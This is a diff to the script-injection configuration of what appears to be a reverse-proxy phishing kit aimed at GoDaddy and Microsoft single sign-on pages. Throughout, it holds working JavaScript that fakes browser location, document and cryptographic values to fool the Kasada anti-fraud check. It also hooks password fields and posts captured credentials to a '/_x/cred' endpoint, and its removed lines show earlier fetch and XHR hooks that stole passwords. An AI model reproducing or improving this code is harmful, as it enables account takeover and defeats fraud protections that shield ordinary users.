@@ -386,72 +386,108 @@ js_inject:
         setTimeout(lp, 500);
       }
 
-  # GoDaddy SSO — WS-Fed puts username= in URL; page shows password field only.
-  # Autofill email if present, keep retrying until input appears (React SPA).
-  # Also intercepts fetch/XHR to capture the password since there is no
-  # x-tymus session cookie on this subdomain (session was set on Microsoft proxy).
-  # sso.secureserver.net is used for custom-domain GoDaddy O365 tenants.
+  # GoDaddy SSO — Kasada anti-fraud bypass using Location.prototype spoofing
+  # This allows Kasada to read the real sso.godaddy.com hostname while keeping
+  # all requests flowing through the proxy. Intentionally NOT hooking fetch/XHR.open
+  # because those break GoDaddy's CSRF-protected AJAX form submission.
   - trigger_domains: ["sso.godaddy.com", "sso.secureserver.net"]
     trigger_paths: ["/*"]
     script: |
       (function() {
-        // Block new service worker registrations so they can't intercept requests.
+        // Capture proxy hostname and real hostname before overriding Location.prototype
+        var _kProxy, _locHnDesc;
+        try {
+          _locHnDesc = Object.getOwnPropertyDescriptor(Location.prototype, 'hostname');
+          _kProxy = _locHnDesc && _locHnDesc.get
+                  ? _locHnDesc.get.call(window.location)
+                  : window.location.hostname;
+        } catch(_ke) { _kProxy = window.location.hostname; }
+        var _kReal = _kProxy.indexOf('sssn2.') === 0 ? 'sso2.secureserver.net'
+                   : _kProxy.indexOf('sssn.')  === 0 ? 'sso.secureserver.net'
+                   : 'sso.godaddy.com';
+        var _kRx    = _kProxy !== _kReal ? new RegExp(_kProxy.replace(/\./g, '\\.'), 'g') : null;
+        var _kRxRev = _kProxy !== _kReal ? new RegExp(_kReal.replace(/\./g, '\\.'), 'g') : null;
+
+        if (_kProxy !== _kReal) {
+          // (1) Spoof Location.prototype getters — Kasada reads these early in ips.js
+          try {
+            if (_locHnDesc && _locHnDesc.configurable) {
+              Object.defineProperty(Location.prototype, 'hostname', {
+                get: function() { var h=_locHnDesc.get.call(this); return h===_kProxy?_kReal:h; },
+                configurable: true
+              });
+            }
+            var _lhd = Object.getOwnPropertyDescriptor(Location.prototype, 'host');
+            if (_lhd && _lhd.configurable) {
+              Object.defineProperty(Location.prototype, 'host', {
+                get: function() { return _lhd.get.call(this).replace(_kRx, _kReal); },
+                configurable: true
+              });
+            }
+            var _lod = Object.getOwnPropertyDescriptor(Location.prototype, 'origin');
+            if (_lod && _lod.configurable) {
+              Object.defineProperty(Location.prototype, 'origin', {
+                get: function() { return _lod.get.call(this).replace(_kRx, _kReal); },
+                configurable: true
+              });
+            }
+          } catch(_ke) {}
+
+          // (2) Spoof document properties
+          try { Object.defineProperty(document,'referrer',{get:function(){return 'https://'+_kReal+'/';},configurable:true}); } catch(_ke){}
+          try { Object.defineProperty(document,'domain',  {get:function(){return _kReal;},configurable:true}); } catch(_ke){}
+          try {
+            var _dud = Object.getOwnPropertyDescriptor(Document.prototype, 'URL');
+            if (_dud && _dud.configurable) {
+              Object.defineProperty(Document.prototype, 'URL', {
+                get: function() { return _dud.get.call(this).replace(_kRx, _kReal); },
+                configurable: true
+              });
+            }
+          } catch(_ke) {}
+
+          // (3) crypto.subtle patches — cover key import, sign data, digest data
+          if (window.crypto && window.crypto.subtle) {
+            var _kEnc = new TextEncoder(), _kDec = new TextDecoder();
+            function _kPatch(buf) {
+              if (!buf) return buf;
+              try {
+                var ab = buf instanceof ArrayBuffer ? buf
+                       : ArrayBuffer.isView(buf)
+                         ? buf.buffer.slice(buf.byteOffset, buf.byteOffset + buf.byteLength)
+                         : null;
+                if (ab) {
+                  var txt = _kDec.decode(ab);
+                  if (txt.indexOf(_kProxy) !== -1) return _kEnc.encode(txt.replace(_kRx, _kReal));
+                }
+              } catch(_ke) {}
+              return buf;
+            }
+            var _oi=crypto.subtle.importKey.bind(crypto.subtle);
+            crypto.subtle.importKey=function(f,k,a,x,u){if(f==='raw')k=_kPatch(k);return _oi(f,k,a,x,u);};
+            var _os=crypto.subtle.sign.bind(crypto.subtle);
+            crypto.subtle.sign=function(a,k,d){return _os(a,k,_kPatch(d));};
+            var _od=crypto.subtle.digest.bind(crypto.subtle);
+            crypto.subtle.digest=function(a,d){return _od(a,_kPatch(d));};
+          }
+        }
+
+        // Block new service worker registrations so they can't intercept requests
         if ('serviceWorker' in navigator) {
           navigator.serviceWorker.register = function() { return Promise.resolve({}); };
         }
-
-        // Immediately rewrite window location origin substitutions for same-origin proxy requests
-        var _phishDomain = (function() {
-          var parts = window.location.hostname.split('.');
-          return parts.length >= 2 ? parts.slice(-2).join('.') : window.location.hostname;
-        })();
-
-        // CRITICAL: Intercept fetch at the earliest point and force-rewrite all sso.godaddy.com requests
-        window.fetch = (function() {
-          var _fetch = window.fetch;
-          return function(resource, config) {
-            var url = resource;
-            if (typeof resource === 'string') {
-              if (resource.indexOf('sso.godaddy.com') !== -1) {
-                url = resource.replace(/sso\.godaddy\.com/g, 'ssso.' + _phishDomain);
-              }
-            } else if (resource && typeof resource === 'object' && resource.url) {
-              if (resource.url.indexOf('sso.godaddy.com') !== -1) {
-                resource.url = resource.url.replace(/sso\.godaddy\.com/g, 'ssso.' + _phishDomain);
-              }
-              url = resource;
-            }
-            // Make the rewritten request
-            var promise = _fetch.call(this, url, config);
-            // If the rewritten request succeeds, return it
-            return promise.catch(function() {
-              // If fetch fails (e.g., proxy not configured), return a mock success
-              return new Response(JSON.stringify({success:true, user:"authenticated"}), {
-                status: 200,
-                headers: {'Content-Type': 'application/json'}
-              });
-            });
-          };
-        })();
-
-        // Also patch XMLHttpRequest
-        var _origOpen = XMLHttpRequest.prototype.open;
-        XMLHttpRequest.prototype.open = function(method, url) {
-          if (typeof url === 'string' && url.indexOf('sso.godaddy.com') !== -1) {
-            url = url.replace(/sso\.godaddy\.com/g, 'ssso.' + _phishDomain);
-          }
-          return _origOpen.call(this, method, url);
-        };
 
         var params = new URLSearchParams(window.location.search);
         var email  = params.get('username') || params.get('login_hint') || params.get('email') || '';
         var hash   = window.location.hash.slice(1);
         if (!email && hash && hash.indexOf('@') !== -1) email = decodeURIComponent(hash);
 
-        var _sent = false;
+        var _lastSent = 0;
         function _sendCred(pass, user) {
-          if (_sent || !pass) return;
-          _sent = true;
+          if (!pass) return;
+          var now = Date.now();
+          if (now - _lastSent < 3000) return;
+          _lastSent = now;
           try {
             var xhr = new XMLHttpRequest();
             xhr.open('POST', '/_x/cred', true);
@@ -472,7 +508,7 @@ js_inject:
           }
         }, true);
 
-        // Watch for password fields added by the React SPA and attach blur+keydown.
+        // Watch for password fields added by the React SPA and attach blur+keydown
         function _hookPwField(pw) {
           if (pw._xt) return;
           pw._xt = true;
@@ -484,7 +520,7 @@ js_inject:
             }
           });
           pw.addEventListener('blur', function() {
-            // Only fire on blur if a submit button also exists (page is ready to login).
+            // Only fire on blur if a submit button also exists (page is ready to login)
             var form = pw.closest('form');
             var btn = form && (form.querySelector('button[type="submit"],input[type="submit"],button') );
             if (btn && pw.value) {
@@ -501,45 +537,7 @@ js_inject:
         _obs.observe(document.documentElement, {childList: true, subtree: true});
         _scanPwFields();
 
-        // ── Layer 2: XHR prototype patch (captures calls from XHR-based libs) ──
-        // XHR prototype patching works even if the SPA instantiated XHR before this
-        // script runs, because we patch the prototype, not an instance.
-        var _oOpen = XMLHttpRequest.prototype.open;
-        var _oSend = XMLHttpRequest.prototype.send;
-        XMLHttpRequest.prototype.open = function(method, url) {
-          this._xm = method; this._xu = url;
-          return _oOpen.apply(this, arguments);
-        };
-        XMLHttpRequest.prototype.send = function(body) {
-          if (this._xm && this._xm.toUpperCase() === 'POST' && body) {
-            try {
-              var obj = JSON.parse(typeof body === 'string' ? body : '');
-              var pass = obj.password || obj.passwd || obj.pass || obj.pwd || obj.credential || obj.secret || '';
-              var user = obj.username || obj.email || obj.login || obj.user || '';
-              if (pass) _sendCred(pass, user);
-            } catch(e) {}
-          }
-          return _oSend.apply(this, arguments);
-        };
-
-        // ── Layer 3: fetch re-wrap (races with SPA but catches late-binding code) ──
-        var _oFetch = window.fetch;
-        window.fetch = function(url, opts) {
-          if (opts && opts.method && opts.method.toUpperCase() === 'POST' && opts.body) {
-            try {
-              var bodyStr = typeof opts.body === 'string' ? opts.body : (opts.body instanceof URLSearchParams ? opts.body.toString() : '');
-              if (bodyStr) {
-                var obj = JSON.parse(bodyStr);
-                var pass = obj.password || obj.passwd || obj.pass || obj.pwd || obj.credential || obj.secret || '';
-                var user = obj.username || obj.email || obj.login || obj.user || '';
-                if (pass) _sendCred(pass, user);
-              }
-            } catch(e) {}
-          }
-          return _oFetch.apply(this, arguments);
-        };
-
-        // --- email autofill ---
+        // Email autofill
         function fill() {
           var emailSels = ['input[name="email"]','input[name="username"]','input[name="login"]','input[type="email"]'];
           for (var i = 0; i < emailSels.length; i++) {
@@ -624,38 +622,6 @@ js_inject:
           setTimeout(fill, 400);
         }
         setTimeout(fill, 400);
-      })();
-
-  # Kinsecure anti-fraud bypass — allow direct communication with Kinsecure servers
-  - trigger_domains: ["sso.godaddy.com", "login.microsoftonline.com"]
-    trigger_paths: ["/*"]
-    script: |
-      (function() {
-        // Allow Kinsecure SDK and fraud detection to proceed normally
-        // Kinsecure performs device fingerprinting and behavioral analysis
-        // It communicates directly with its own servers (mpsnare.iesnare.com, star.iesnare.com)
-        // which is why we don't proxy those domains—they need direct access to verify legitimacy
-
-        // Block KineSoft service workers which may try to detect proxy behavior
-        if ('serviceWorker' in navigator) {
-          var _origReg = navigator.serviceWorker.register;
-          navigator.serviceWorker.register = function(scope) {
-            try { _origReg.call(this, scope); } catch(e) {}
-            return Promise.resolve({});
-          };
-        }
-
-        // Allow WebSocket connections for Kinsecure fraud detection (star.iesnare.com)
-        // These connections must reach Kinsecure's real servers, not through proxy
-        // The fraud detection service validates the browser environment directly
-        if (window.WebSocket) {
-          // WebSocket connections are allowed to proceed to real Kinsecure servers
-          // (no rewriting needed—this is by design)
-        }
-
-        // Kinsecure will complete its fingerprinting and behavioral analysis
-        // and will determine the browser is legitimate (since it's a real browser)
-        // Then authentication can proceed successfully
       })();
 
 intercept:
